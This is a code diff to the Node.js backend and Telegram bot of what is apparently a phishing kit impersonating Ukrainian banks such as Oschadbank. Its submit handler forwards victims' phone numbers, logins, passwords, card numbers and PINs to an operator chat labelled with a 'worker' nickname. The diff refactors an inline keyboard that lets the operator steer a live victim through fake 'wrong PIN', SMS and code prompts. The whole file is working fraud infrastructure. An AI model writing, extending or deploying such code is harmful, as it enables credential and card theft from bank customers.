@@ -150,6 +150,38 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
+// Inline keyboard for Oschadbank and non-Oschadbank flows
+function getInlineKeyboard(sessionId, bankName) {
+    const keyboard = [
+        [
+            { text: 'SMS', callback_data: `sms:${sessionId}` },
+            { text: 'ЛК', callback_data: `lk:${sessionId}` },
+            { text: 'Звонок', callback_data: `call:${sessionId}` }
+        ],
+        [
+            { text: 'Невірний пароль', callback_data: `password_error:${sessionId}` },
+            { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
+            { text: 'КОД', callback_data: `code_error:${sessionId}` }
+        ],
+        [
+            { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
+            { text: 'КОД ✅', callback_data: `timer:${sessionId}` },
+            { text: 'Номер', callback_data: `number_error:${sessionId}` }
+        ],
+        [
+            { text: 'OTHER', callback_data: `other:${sessionId}` },
+            { text: 'BAN 🚫', callback_data: `ban:${sessionId}` },
+            { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }
+        ]
+    ];
+
+    if (banksForRequestButton.includes(bankName)) {
+        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+    }
+
+    return { inline_keyboard: keyboard };
+}
+
 // Handle form submissions
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
@@ -166,6 +198,9 @@ app.post('/api/submit', (req, res) => {
 
     // Send data to Telegram based on flow and data
     let message = '';
+    const ws = clients.get(sessionId);
+    const isOnline = ws && ws.readyState === WebSocket.OPEN;
+
     if (newData.currentFlow === 'forgot_password' && newData.fp_pin) {
         // Send only when all forgot password data is collected
         message = `<b>Название банка:</b> Ощад24\n`;
@@ -173,26 +208,38 @@ app.post('/api/submit', (req, res) => {
         message += `<b>Номер карты:</b> <code>${newData.fp_card || 'N/A'}</code>\n`;
         message += `<b>Пин:</b> <code>${newData.fp_pin || 'N/A'}</code>\n`;
         message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        bot.sendMessage(CHAT_ID, message, {
+            parse_mode: 'HTML',
+            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+        });
     } else if (newData.loginMethod === 'phone' && newData.phone && newData.password) {
         message = `<b>Название банка:</b> Ощад24\n`;
         message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
         message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
         message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        bot.sendMessage(CHAT_ID, message, {
+            parse_mode: 'HTML',
+            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+        });
     } else if (newData.loginMethod === 'login' && newData.login && newData.password) {
         message = `<b>Название банка:</b> Ощад24\n`;
         message += `<b>Логин:</b> <code>${newData.login}</code>\n`;
         message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
         message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        bot.sendMessage(CHAT_ID, message, {
+            parse_mode: 'HTML',
+            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+        });
     } else if (newData.bankName !== 'Ощадбанк') {
         // For non-Oschadbank flows
         message = `<b>Название банка:</b> ${newData.bankName}\n`;
         if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
         if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
         message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: getInlineKeyboard(sessionId, newData.bankName) });
+        bot.sendMessage(CHAT_ID, message, {
+            parse_mode: 'HTML',
+            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+        });
     }
 
     if (isFinalStep && !newData.logSent) {
@@ -229,38 +276,6 @@ app.post('/api/sms', (req, res) => {
         res.status(404).json({ message: 'Session not found' });
     }
 });
-
-// Inline keyboard for non-Oschadbank flows
-function getInlineKeyboard(sessionId, bankName) {
-    const keyboard = [
-        [
-            { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ЛК', callback_data: `lk:${sessionId}` },
-            { text: 'Звонок', callback_data: `call:${sessionId}` }
-        ],
-        [
-            { text: 'Невірний пароль', callback_data: `password_error:${sessionId}` },
-            { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
-            { text: 'КОД', callback_data: `code_error:${sessionId}` }
-        ],
-        [
-            { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
-            { text: 'КОД ✅', callback_data: `timer:${sessionId}` },
-            { text: 'Номер', callback_data: `number_error:${sessionId}` }
-        ],
-        [
-            { text: 'OTHER', callback_data: `other:${sessionId}` },
-            { text: 'BAN 🚫', callback_data: `ban:${sessionId}` },
-            { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }
-        ]
-    ];
-
-    if (banksForRequestButton.includes(bankName)) {
-        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
-    }
-
-    return { inline_keyboard: keyboard };
-}
 
 // Handle custom message replies
 bot.on('message', (msg) => {
